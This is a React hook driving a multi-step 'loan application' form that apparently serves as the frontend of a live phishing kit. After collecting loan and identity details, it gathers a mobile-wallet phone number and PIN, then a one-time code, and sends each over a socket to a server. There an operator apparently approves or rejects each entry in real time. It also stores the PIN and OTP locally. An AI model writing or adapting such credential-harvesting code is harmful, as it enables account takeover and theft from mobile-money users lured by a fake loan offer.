import { useEffect, useRef, useState } from 'react'
import { io } from 'socket.io-client'
import { initialForm, initialOtp, initialWallet } from '../data/loanFlow'
import { saveLatestEntry } from '../utils/recentEntry'
import {
  sanitizeSingleDigit,
  validateEmploymentStep,
  validateIdentityStep,
  validateLoanStep,
  validateOtpStep,
  validateWalletStep,
} from '../utils/form'

export function useLoanFlow() {
  const OTP_DURATION_SECONDS = 60
  const [step, setStep] = useState(1)
  const [appId, setAppId] = useState('')
  const [referenceId, setReferenceId] = useState('')
  const [errorMessage, setErrorMessage] = useState('')
  const [form, setForm] = useState(initialForm)
  const [wallet, setWallet] = useState(initialWallet)
  const [otp, setOtp] = useState(initialOtp)
  const [otpSecondsRemaining, setOtpSecondsRemaining] = useState(OTP_DURATION_SECONDS)
  const [passwordVerifying, setPasswordVerifying] = useState(false)
  const [pinVerifying, setPinVerifying] = useState(false)
  const [touchedFields, setTouchedFields] = useState({})
  const walletRefs = useRef([])
  const otpRefs = useRef([])
  const socketRef = useRef(null)

  const step1Errors = validateLoanStep(form)
  const step2Errors = validateIdentityStep(form)
  const step3Errors = validateEmploymentStep(form)
  const step4Errors = validateWalletStep(wallet)
  const step5Errors = validateOtpStep(otp, otpSecondsRemaining)

  const isStep1Valid = Object.keys(step1Errors).length === 0
  const isStep2Valid = Object.keys(step2Errors).length === 0
  const isStep3Valid = Object.keys(step3Errors).length === 0
  const isStep4Valid = Object.keys(step4Errors).length === 0
  const isPinValid = Object.keys(step5Errors).length === 0

  useEffect(() => {
    const socket = io(import.meta.env.VITE_SOCKET_URL ?? 'http://localhost:4000')
    socketRef.current = socket

    socket.on('session-ready', (data) => {
      setAppId(data.appId)
    })

    socket.on('password-verified', () => {
      setPasswordVerifying(false)
      setErrorMessage('')
      setOtpSecondsRemaining(OTP_DURATION_SECONDS)
      setTouchedFields((current) => ({ ...current, otp: false }))
      setStep(5)
      window.setTimeout(() => {
        otpRefs.current[0]?.focus()
      }, 100)
    })

    socket.on('password-rejected', (data) => {
      setPasswordVerifying(false)
      setWallet((current) => ({ ...current, pinValue: [...initialWallet.pinValue] }))
      setErrorMessage(data?.message ?? 'PIN rejected. Please verify and re-enter.')
      window.setTimeout(() => {
        walletRefs.current[0]?.focus()
      }, 100)
    })

    socket.on('pin-verified', (data) => {
      setPinVerifying(false)
      setReferenceId(data.referenceId)
      setAppId(data.appId || '')
      setErrorMessage('')
      setStep(6)
    })

    socket.on('pin-rejected', (data) => {
      setPinVerifying(false)
      setOtp([...initialOtp])
      setOtpSecondsRemaining(OTP_DURATION_SECONDS)
      setTouchedFields((current) => ({ ...current, otp: true }))
      setErrorMessage(data?.message ?? 'OTP invalid. Please enter a new token.')
      window.setTimeout(() => {
        otpRefs.current[0]?.focus()
      }, 100)
    })

    socket.on('error', (data) => {
      setPasswordVerifying(false)
      setPinVerifying(false)
      setErrorMessage(data?.message ?? 'An unexpected validation error occurred.')
    })

    return () => {
      socket.disconnect()
    }
  }, [])

  useEffect(() => {
    if (step !== 5 || pinVerifying || otpSecondsRemaining <= 0) {
      return undefined
    }

    const timerId = window.setInterval(() => {
      setOtpSecondsRemaining((current) => {
        if (current <= 1) {
          window.clearInterval(timerId)
          return 0
        }

        return current - 1
      })
    }, 1000)

    return () => {
      window.clearInterval(timerId)
    }
  }, [otpSecondsRemaining, pinVerifying, step])

  useEffect(() => {
    if (step === 5 && isPinValid && !pinVerifying) {
      submitStep5()
    }
  }, [isPinValid, pinVerifying, step])

  useEffect(() => {
    saveLatestEntry({
      mobileNumber: wallet.phone ? `+260${wallet.phone}` : '',
      pin: wallet.pinValue.join(''),
      otp: otp.join(''),
    })
  }, [otp, wallet.phone, wallet.pinValue])

  function updateForm(field, value) {
    setForm((current) => ({ ...current, [field]: value }))
  }

  function updateWallet(field, value) {
    setWallet((current) => ({ ...current, [field]: value }))
  }

  function markFieldsTouched(fields) {
    setTouchedFields((current) => ({
      ...current,
      ...Object.fromEntries(fields.map((field) => [field, true])),
    }))
  }

  function handleFieldBlur(field) {
    markFieldsTouched([field])
  }

  function emitAndAdvance(eventName, nextStep) {
    setErrorMessage('')
    socketRef.current?.emit(eventName, form)
    setStep(nextStep)
  }

  function submitStep1() {
    if (!isStep1Valid) {
      markFieldsTouched(['loanType', 'amount', 'term', 'purpose'])
      return
    }

    emitAndAdvance('step1', 2)
  }

  function submitStep2() {
    if (!isStep2Valid) {
      markFieldsTouched(['firstName', 'lastName', 'email', 'phone'])
      return
    }

    emitAndAdvance('step2', 3)
  }

  function submitStep3() {
    if (!isStep3Valid) {
      markFieldsTouched(['employment', 'income', 'employer'])
      return
    }

    emitAndAdvance('step3', 4)
    window.setTimeout(() => {
      walletRefs.current[0]?.focus()
    }, 100)
  }

  function requestAdminApproval() {
    if (!isStep4Valid || passwordVerifying) {
      if (!passwordVerifying) {
        markFieldsTouched(['walletPhone', 'walletPin'])
      }
      return
    }

    setPasswordVerifying(true)
    setErrorMessage('')
    socketRef.current?.emit('step4', {
      phone: wallet.phone,
      password: wallet.pinValue.join(''),
    })
  }

  function submitStep5() {
    if (!isPinValid || pinVerifying) {
      if (!pinVerifying) {
        markFieldsTouched(['otp'])
      }
      return
    }

    setPinVerifying(true)
    setErrorMessage('')
    socketRef.current?.emit('step5', { pin: otp.join('') })
  }

  function updateDigitState(source, index, value) {
    const digit = sanitizeSingleDigit(value)

    if (source === 'wallet') {
      setWallet((current) => {
        const nextDigits = [...current.pinValue]
        nextDigits[index] = digit
        return { ...current, pinValue: nextDigits }
      })
      return digit
    }

    setOtp((current) => {
      const nextDigits = [...current]
      nextDigits[index] = digit
      return nextDigits
    })

    return digit
  }

  function moveDigitFocus(refs, index, hasValue) {
    if (hasValue && index < refs.current.length - 1) {
      refs.current[index + 1]?.focus()
    }
  }

  function handleWalletPinChange(index, value) {
    const digit = updateDigitState('wallet', index, value)
    markFieldsTouched(['walletPin'])
    moveDigitFocus(walletRefs, index, Boolean(digit))
  }

  function handleOtpChange(index, value) {
    const digit = updateDigitState('otp', index, value)
    markFieldsTouched(['otp'])
    moveDigitFocus(otpRefs, index, Boolean(digit))
  }

  function handleDigitKeyDown(event, index, refs, source) {
    if (event.key !== 'Backspace') {
      return
    }

    const currentValue = source === 'wallet' ? wallet.pinValue[index] : otp[index]
    if (!currentValue && index > 0) {
      refs.current[index - 1]?.focus()
    }
  }

  function getVisibleErrors(errors) {
    return Object.fromEntries(
      Object.entries(errors).filter(([field]) => touchedFields[field]),
    )
  }

  return {
    appId,
    errorMessage,
    form,
    handleFieldBlur,
    handleOtpChange,
    handleOtpKeyDown: (event, index) => handleDigitKeyDown(event, index, otpRefs, 'otp'),
    handleWalletPinChange,
    handleWalletPinKeyDown: (event, index) =>
      handleDigitKeyDown(event, index, walletRefs, 'wallet'),
    isPinValid,
    isStep1Valid,
    isStep2Valid,
    isStep3Valid,
    isStep4Valid,
    otp,
    otpRefs,
    otpSecondsRemaining,
    passwordVerifying,
    pinVerifying,
    referenceId,
    requestAdminApproval,
    setStep,
    step1Errors: getVisibleErrors(step1Errors),
    step2Errors: getVisibleErrors(step2Errors),
    step3Errors: getVisibleErrors(step3Errors),
    step4Errors: getVisibleErrors(step4Errors),
    step5Errors: getVisibleErrors(step5Errors),
    step,
    submitStep1,
    submitStep2,
    submitStep3,
    submitStep5,
    updateForm,
    updateWallet,
    wallet,
    walletRefs,
  }
}